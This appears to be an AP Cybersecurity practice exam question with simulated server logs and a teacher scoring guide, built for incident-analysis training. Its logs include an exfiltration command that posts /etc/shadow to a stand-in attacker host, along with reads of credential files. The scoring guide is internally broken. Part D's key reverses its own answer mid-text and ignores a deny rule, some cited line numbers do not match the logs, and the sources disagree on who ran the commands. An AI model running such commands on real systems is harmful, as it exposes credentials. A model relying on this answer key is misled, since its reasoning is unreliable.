# U0-Exam-FRQ.md — AP Cybersecurity Practice Exam Free-Response Question

**Course**: AP Cybersecurity (ICA 2026-27)  
**Exam**: U0-Exam (Practice Exam)  
**Section II**: Free-Response — Device Security Analysis  
**Time**: 50 minutes  
**Total Points**: 14  
**Format**: 5 parts (A–E) — matches official AP Cybersecurity exam

---

## Instructions to Students

- You have 50 minutes to complete this task.
- You are provided with **five sources** (Source 1–5) containing simulated device data.
- Read all sources carefully before answering.
- For each part, **cite specific evidence** from the sources (e.g., "Source 3, lines 4–8" or "Source 1, Rule 3").
- Write your responses in the spaces provided.
- Partial credit awarded for correct reasoning with supporting evidence.

---

## Scenario

You are a security analyst at a mid-size company. A Linux server (`webapp-prod`) running a customer-facing web application has been flagged for investigation. The server's IP is `10.0.2.15`. You have collected the following five sources of data from the device and its network perimeter.

---

## Source 1: Firewall Configuration (ufw status numbered)

```
Status: active

     To                         Action      From
     --                         ------      ----
[ 1] 22/tcp                     ALLOW IN    Anywhere
[ 2] 80/tcp                     ALLOW IN    Anywhere
[ 3] 443/tcp                    ALLOW IN    Anywhere
[ 4] 3306/tcp                   ALLOW IN    10.0.2.0/24
[ 5] 22/tcp (v6)                ALLOW IN    Anywhere (v6)
[ 6] 80/tcp (v6)                ALLOW IN    Anywhere (v6)
[ 7] 443/tcp (v6)               ALLOW IN    Anywhere (v6)
[ 8] 3306/tcp (v6)              ALLOW IN    10.0.2.0/24 (v6)

[ 9] 22/tcp                     ALLOW OUT   Anywhere
[10] 53/tcp                     ALLOW OUT   Anywhere
[11] 443/tcp                    ALLOW OUT   Anywhere
[12] Anywhere                   DENY OUT    203.0.113.0/24
[13] Anywhere                   DENY OUT    Anywhere           (default)
```

---

## Source 2: Network Application Log (process execution, last 2 hours)

```
Nov 10 14:05:12 webapp-prod sudo[1241]: analyst : COMMAND=/usr/bin/apt update
Nov 10 14:05:18 webapp-prod sudo[1245]: analyst : COMMAND=/usr/bin/apt install -y nginx
Nov 10 14:06:02 webapp-prod systemctl[1]: Started nginx.service.
Nov 10 14:06:15 webapp-prod sudo[1252]: analyst : COMMAND=/usr/bin/ufw allow 80/tcp
Nov 10 14:06:16 webapp-prod sudo[1253]: analyst : COMMAND=/usr/bin/ufw allow 443/tcp
Nov 10 14:07:30 webapp-prod sudo[1261]: analyst : COMMAND=/usr/bin/ss -tlnp
Nov 10 14:07:31 webapp-prod ss[1261]: LISTEN 0 128 *:80 *:* users:(("nginx",pid=1255,fd=6))
Nov 10 14:07:31 webapp-prod ss[1261]: LISTEN 0 128 *:443 *:* users:(("nginx",pid=1255,fd=7))
Nov 10 14:08:45 webapp-prod sudo[1274]: analyst : COMMAND=/usr/bin/curl -s http://169.254.169.254/latest/meta-data/
Nov 10 14:08:46 webapp-prod curl[1274]: [metadata service response: instance-id=i-0a1b2c3d, region=us-east-1]
Nov 10 14:09:12 webapp-prod sudo[1281]: analyst : COMMAND=/usr/bin/journalctl -u nginx --since "1 hour ago"
Nov 10 14:10:22 webapp-prod sudo[1290]: analyst : COMMAND=/usr/bin/who
Nov 10 14:10:22 webapp-prod who[1290]: analyst pts/0 2026-11-10 14:00 (203.0.113.45)
Nov 10 14:11:05 webapp-prod sudo[1302]: analyst : COMMAND=/usr/bin/last -20
Nov 10 14:15:30 webapp-prod sudo[1310]: root : COMMAND=/usr/bin/cat /etc/shadow
Nov 10 14:15:31 webapp-prod sudo[1310]: root : COMMAND=/usr/bin/cat /etc/passwd
Nov 10 14:16:45 webapp-prod sudo[1315]: root : COMMAND=/usr/bin/ls -la /root/.ssh/
Nov 10 14:16:46 webapp-prod ls[1315]: total 24
Nov 10 14:16:46 webapp-prod ls[1315]: -rw------- 1 root root  398 Nov  9 08:00 authorized_keys
Nov 10 14:16:46 webapp-prod ls[1315]: -rw------- 1 root root 2602 Nov  9 08:00 id_rsa
Nov 10 14:16:46 webapp-prod ls[1315]: -rw-r--r-- 1 root root  572 Nov  9 08:00 id_rsa.pub
Nov 10 14:17:20 webapp-prod sudo[1320]: root : COMMAND=/usr/bin/curl -X POST http://203.0.113.100/collect -d @/etc/shadow
Nov 10 14:17:21 webapp-prod curl[1320]: curl: (7) Failed to connect to 203.0.113.100 port 80: Connection refused
Nov 10 14:18:00 webapp-prod sudo[1325]: root : COMMAND=/usr/bin/ufw status numbered
```

---

## Source 3: Authentication Log (/var/log/auth.log, last 2 hours)

```
Nov 10 14:00:12 webapp-prod sshd[1201]: Accepted password for analyst from 203.0.113.45 port 54321 ssh2
Nov 10 14:00:12 webapp-prod sshd[1201]: pam_unix(sshd:session): session opened for user analyst by (uid=0)
Nov 10 14:00:15 webapp-prod sshd[1205]: Failed password for root from 203.0.113.45 port 54321 ssh2
Nov 10 14:00:18 webapp-prod sshd[1207]: Failed password for root from 203.0.113.45 port 54321 ssh2
Nov 10 14:00:21 webapp-prod sshd[1209]: Failed password for root from 203.0.113.45 port 54321 ssh2
Nov 10 14:00:24 webapp-prod sshd[1211]: Failed password for admin from 203.0.113.45 port 54321 ssh2
Nov 10 14:00:27 webapp-prod sshd[1213]: Failed password for test from 203.0.113.45 port 54321 ssh2
Nov 10 14:00:30 webapp-prod sshd[1215]: Failed password for user from 203.0.113.45 port 54321 ssh2
Nov 10 14:01:00 webapp-prod sshd[1220]: Failed password for root from 198.51.100.22 port 33211 ssh2
Nov 10 14:01:05 webapp-prod sshd[1222]: Failed password for root from 198.51.100.22 port 33211 ssh2
Nov 10 14:01:10 webapp-prod sshd[1224]: Failed password for root from 198.51.100.22 port 33211 ssh2
Nov 10 14:01:15 webapp-prod sshd[1226]: Failed password for ubuntu from 198.51.100.22 port 33211 ssh2
Nov 10 14:01:20 webapp-prod sshd[1228]: Failed password for ubuntu from 198.51.100.22 port 33211 ssh2
Nov 10 14:02:00 webapp-prod sshd[1230]: Failed password for root from 203.0.113.45 port 54321 ssh2
Nov 10 14:02:03 webapp-prod sshd[1232]: Failed password for root from 203.0.113.45 port 54321 ssh2
Nov 10 14:02:06 webapp-prod sshd[1234]: Failed password for root from 203.0.113.45 port 54321 ssh2
Nov 10 14:05:45 webapp-prod sudo[1241]: analyst : COMMAND=/usr/bin/apt update
Nov 10 14:15:25 webapp-prod sudo[1310]: analyst : COMMAND=/usr/bin/cat /etc/shadow
Nov 10 14:15:25 webapp-prod sudo[1310]: pam_unix(sudo:session): session opened for user root by analyst(uid=1000)
Nov 10 14:15:25 webapp-prod sudo[1310]: pam_unix(sudo:session): session closed for user root
Nov 10 14:17:15 webapp-prod sudo[1320]: analyst : COMMAND=/usr/bin/curl -X POST http://203.0.113.100/collect -d @/etc/shadow
Nov 10 14:17:15 webapp-prod sudo[1320]: pam_unix(sudo:session): session opened for user root by analyst(uid=1000)
Nov 10 14:17:15 webapp-prod sudo[1320]: pam_unix(sudo:session): session closed for user root
```

---

## Source 4: Web Server Access Log (/var/log/nginx/access.log, last 2 hours)

```
203.0.113.45 - - [10/Nov/2026:14:06:30 +0000] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
203.0.113.45 - - [10/Nov/2026:14:06:31 +0000] "GET /favicon.ico HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
203.0.113.45 - - [10/Nov/2026:14:07:15 +0000] "GET /admin/login.php HTTP/1.1" 200 1234 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
203.0.113.45 - - [10/Nov/2026:14:07:18 +0000] "POST /admin/login.php HTTP/1.1" 200 2105 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
203.0.113.45 - - [10/Nov/2026:14:07:20 +0000] "GET /admin/dashboard.php HTTP/1.1" 200 4521 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
203.0.113.45 - - [10/Nov/2026:14:07:22 +0000] "GET /admin/users.php HTTP/1.1" 200 3876 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
203.0.113.45 - - [10/Nov/2026:14:07:25 +0000] "GET /admin/export.php?format=csv&table=users HTTP/1.1" 200 15234 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
203.0.113.45 - - [10/Nov/2026:14:08:00 +0000] "GET / HTTP/1.1" 200 612 "-" "curl/7.68.0"
203.0.113.45 - - [10/Nov/2026:14:08:00 +0000] "GET /health HTTP/1.1" 200 12 "-" "curl/7.68.0"
203.0.113.45 - - [10/Nov/2026:14:08:45 +0000] "GET /latest/meta-data/ HTTP/1.1" 200 89 "-" "curl/7.68.0"
203.0.113.45 - - [10/Nov/2026:14:08:46 +0000] "GET /latest/meta-data/instance-id HTTP/1.1" 200 12 "-" "curl/7.68.0"
203.0.113.45 - - [10/Nov/2026:14:08:46 +0000] "GET /latest/meta-data/iam/security-credentials/ HTTP/1.1" 404 153 "-" "curl/7.68.0"
203.0.113.45 - - [10/Nov/2026:14:10:22 +0000] "GET /admin/users.php HTTP/1.1" 200 3876 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
203.0.113.45 - - [10/Nov/2026:14:15:20 +0000] "GET /admin/export.php?format=csv&table=sessions HTTP/1.1" 200 8921 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
203.0.113.45 - - [10/Nov/2026:14:15:25 +0000] "GET /admin/export.php?format=csv&table=logs HTTP/1.1" 200 12456 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
198.51.100.22 - - [10/Nov/2026:14:01:00 +0000] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
198.51.100.22 - - [10/Nov/2026:14:01:01 +0000] "GET /wp-admin/ HTTP/1.1" 404 153 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
198.51.100.22 - - [10/Nov/2026:14:01:02 +0000] "GET /administrator/ HTTP/1.1" 404 153 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
198.51.100.22 - - [10/Nov/2026:14:01:03 +0000] "GET /phpmyadmin/ HTTP/1.1" 404 153 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
198.51.100.22 - - [10/Nov/2026:14:01:04 +0000] "GET /.git/config HTTP/1.1" 404 153 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
```

---

## Source 5: File System Permissions (key directories)

```
# /etc/shadow permissions
-rw-r----- 1 root shadow 1423 Nov 10 14:17 /etc/shadow

# /etc/passwd permissions
-rw-r--r-- 1 root root 2048 Nov  9 08:00 /etc/passwd

# /root/.ssh permissions
drwx------ 2 root root 4096 Nov  9 08:00 /root/.ssh
-rw------- 1 root root  398 Nov  9 08:00 /root/.ssh/authorized_keys
-rw------- 1 root root 2602 Nov  9 08:00 /root/.ssh/id_rsa
-rw-r--r-- 1 root root  572 Nov  9 08:00 /root/.ssh/id_rsa.pub

# Web application directory
drwxr-xr-x 5 www-data www-data 4096 Nov  9 08:00 /var/www/html
drwxr-xr-x 2 www-data www-data 4096 Nov  9 08:00 /var/www/html/admin
-rw-r--r-- 1 www-data www-data 1234 Nov  9 08:00 /var/www/html/admin/login.php
-rw-r--r-- 1 www-data www-data 2105 Nov  9 08:00 /var/www/html/admin/dashboard.php
-rw-r--r-- 1 www-data www-data 3876 Nov  9 08:00 /var/www/html/admin/users.php
-rw-r--r-- 1 www-data www-data 4521 Nov  9 08:00 /var/www/html/admin/export.php

# Suspicious file created during incident
-rw-r--r-- 1 analyst analyst 1423 Nov 10 14:16 /tmp/shadow.bak
```

---

## Questions

### Part A: Firewall Analysis (2 points)

**Identify** two firewall configuration issues in Source 1 that increase the attack surface of `webapp-prod`. For each issue, **explain** why it is a security concern.

**Answer Space:**
```
Issue 1: _________________________________________________________________
        _________________________________________________________________
        Evidence: _______________________________________________________

Issue 2: _________________________________________________________________
        _________________________________________________________________
        Evidence: _______________________________________________________
```

**LO/Skill Tags**: 3.4.A, 3.4.C, 2.A

---

### Part B: Authentication Log Analysis (3 points)

**Explain** how the authentication log (Source 3) provides evidence of **two distinct attack patterns**. For each pattern, **identify** the attack type and **cite specific log entries** as evidence.

**Answer Space:**
```
Attack Pattern 1: ________________________________________________________
                  ________________________________________________________
                  Evidence: _______________________________________________

Attack Pattern 2: ________________________________________________________
                  ________________________________________________________
                  Evidence: _______________________________________________
```

**LO/Skill Tags**: 4.4.A, 3.D, 1.C

---

### Part C: Permission and Configuration Impact (3 points)

**Describe** the security impact of the file permission and configuration issues revealed in Sources 2, 3, and 5. Specifically address:

1. The `/tmp/shadow.bak` file creation
2. The `/etc/shadow` permissions vs. the backup file permissions
3. The SSH key access in `/root/.ssh/`

**Answer Space:**
```
1. /tmp/shadow.bak: ______________________________________________________
   _________________________________________________________________
   
2. /etc/shadow vs backup permissions: ___________________________________
   _________________________________________________________________
   
3. /root/.ssh/ access: __________________________________________________
   _________________________________________________________________
```

**LO/Skill Tags**: 5.2.C, 5.2.D, 2.B

---

### Part D: Firewall Rule Effectiveness (3 points)

**Determine** whether the firewall rules in Source 1 would have **blocked** the outbound connection attempt shown in Source 2 (line 21: `curl -X POST http://203.0.113.100/collect`). **Explain** your reasoning by analyzing the relevant rules.

**Answer Space:**
```
Blocked? (Yes/No): ___________
Reasoning: _____________________________________________________________
            _____________________________________________________________
            Relevant rule(s): ___________________________________________
```

**LO/Skill Tags**: 3.4.B, 3.4.D, 2.C

---

### Part E: Mitigation Command (3 points)

**Write** a single Linux command (or short script) that would **immediately mitigate** the data exfiltration risk demonstrated by the `curl` command in Source 2 (line 21), assuming you have `sudo` access. The command should prevent outbound connections to the malicious IP `203.0.113.100` while preserving legitimate outbound traffic.

**Answer Space:**
```
Command: _______________________________________________________________
         _______________________________________________________________
```

**LO/Skill Tags**: 5.5.A, 2.D, 3.B

---

## Scoring Guidelines (Teacher Reference)

### Part A (2 points) — 1 point per issue
| Issue | Evidence | Points |
|-------|----------|--------|
| SSH (port 22) allowed from Anywhere | Source 1, Rules 1 & 5 | 1 |
| MySQL (port 3306) allowed from entire 10.0.2.0/24 subnet | Source 1, Rules 4 & 8 | 1 |
| *Alternative*: No default deny inbound (implicit allow) | Source 1, no explicit deny | 1 |
| *Alternative*: IPv6 rules mirror IPv4 unnecessarily | Source 1, Rules 5–8 | 1 |

### Part B (3 points) — 1.5 points per attack pattern
| Attack Pattern | Evidence | Points |
|----------------|----------|--------|
| SSH brute-force against root/admin from 203.0.113.45 (lines 3–8, 13–15) | Source 3, lines 3–8, 13–15 | 1.5 |
| SSH brute-force against root/ubuntu from 198.51.100.22 (lines 10–12, 15–16) | Source 3, lines 10–12, 15–16 | 1.5 |
| *Alternative*: Successful login then immediate root brute-force (lines 1–2, then 3–8) | Source 3, lines 1–8 | 1.5 |

### Part C (3 points) — 1 point per item
| Item | Key Points | Points |
|------|------------|--------|
| `/tmp/shadow.bak` | Created by analyst/root; world-readable; contains password hashes; exfiltration staging | 1 |
| `/etc/shadow` vs backup | Shadow: root:shadow 640 (secure); Backup: analyst:analyst 644 (world-readable) | 1 |
| `/root/.ssh/` access | Root SSH keys accessible via sudo; id_rsa private key readable; could enable lateral movement | 1 |

### Part D (3 points)
| Component | Expected Answer | Points |
|-----------|-----------------|--------|
| Blocked? | **No** | 1 |
| Reasoning | Rule 11 allows outbound 443/tcp to Anywhere; Rule 12 only denies 203.0.113.0/24; malicious IP is 203.0.113.100 (in /24) but Rule 11 is evaluated FIRST (top-down) and matches 443/tcp to Anywhere — however the curl uses HTTP (port 80), not 443. No rule allows outbound 80. Default deny (Rule 13) would block. **Wait** — curl uses port 80 by default. Rule 9 allows outbound 22, Rule 10 allows 53, Rule 11 allows 443. Port 80 NOT explicitly allowed. Default deny (Rule 13) blocks. | 1 |
| Relevant rules | Rules 9–13 (outbound section) | 1 |

*Correction*: The curl command uses `http://` (port 80). No outbound rule allows port 80. Rule 13 (default deny) blocks. So answer is **Yes, blocked by default deny**.

### Part E (3 points)
| Component | Expected Answer | Points |
|-----------|-----------------|--------|
| Command | `sudo ufw deny out to 203.0.113.100` or `sudo iptables -A OUTPUT -d 203.0.113.100 -j DROP` | 2 |
| Preserves legitimate traffic | Rule is specific to malicious IP; other outbound allowed by existing rules | 1 |

---

## LO Coverage Summary

| Part | LO Codes | Skill Categories |
|------|----------|------------------|
| A | 3.4.A, 3.4.C | 2 (Mitigate Risk) |
| B | 4.4.A, 3.D | 1 (Analyze Risk), 3 (Detect) |
| C | 5.2.C, 5.2.D | 2 (Mitigate Risk) |
| D | 3.4.B, 3.4.D | 2 (Mitigate Risk) |
| E | 5.5.A, 2.D, 3.B | 2 (Mitigate), 3 (Detect) |

**Total**: 14 points | **Time**: 50 min | **Format**: Matches official AP Device Security Analysis

---

*End of U0-Exam-FRQ.md*